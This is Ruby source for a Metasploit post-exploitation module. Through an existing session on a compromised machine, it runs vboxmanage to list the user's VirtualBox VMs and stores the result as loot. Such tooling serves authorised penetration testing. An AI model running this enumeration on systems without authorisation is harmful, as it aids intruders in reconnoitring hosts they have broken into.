##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'yaml'

class MetasploitModule < Msf::Post
  include Msf::Post::File


  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Multi Gather VirtualBox VM Enumeration',
      'Description'    => %q{
        This module will attempt to enumerate any VirtualBox VMs on the target machine.
        Due to the nature of VirtualBox, this module can only enumerate VMs registered
        for the current user, therefore, this module needs to be invoked from a user context.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['theLightCosine'],
      'Platform'       => %w{ bsd linux osx unix win },
      'SessionTypes'   => ['shell', 'meterpreter' ]
    ))
  end

  def run
    case session.platform
    when 'windows'
      if session.type == 'meterpreter'
        begin
          res = cmd_exec('c:\\Program Files\\Oracle\\VirtualBox\\vboxmanage', 'list -l vms')
        rescue ::Rex::Post::Meterpreter::RequestError
          print_error('VirtualBox does not appear to be installed on this machine')
          return nil
        end

        if res.empty?
          print_status('VirtualBox is installed but this user has no VMs registered. Try another user.')
          return nil
        end
      else
        res = cmd_exec('"c:\\Program Files\\Oracle\\VirtualBox\\vboxmanage" list -l vms')
        if res.empty?
          print_error('VirtualBox isn\'t installed or this user has no VMs registered')
          return nil
        end
      end
    when 'unix', 'linux', 'bsd', 'osx'
      res = cmd_exec('vboxmanage list -l vms')

      unless res.start_with?('Sun VirtualBox') || res.include?('Name:')
        print_error('VirtualBox isn\'t installed or this user has no VMs registered')
        return nil
      end
    end

    return nil unless res
    vprint_status(res)
    store_path = store_loot('virtualbox_vms', "text/plain", session, res, "virtualbox_vms.txt", "Virtualbox Virtual Machines")
    print_good("#{peer} - File successfully retrieved and saved on #{store_path}")
  end


end
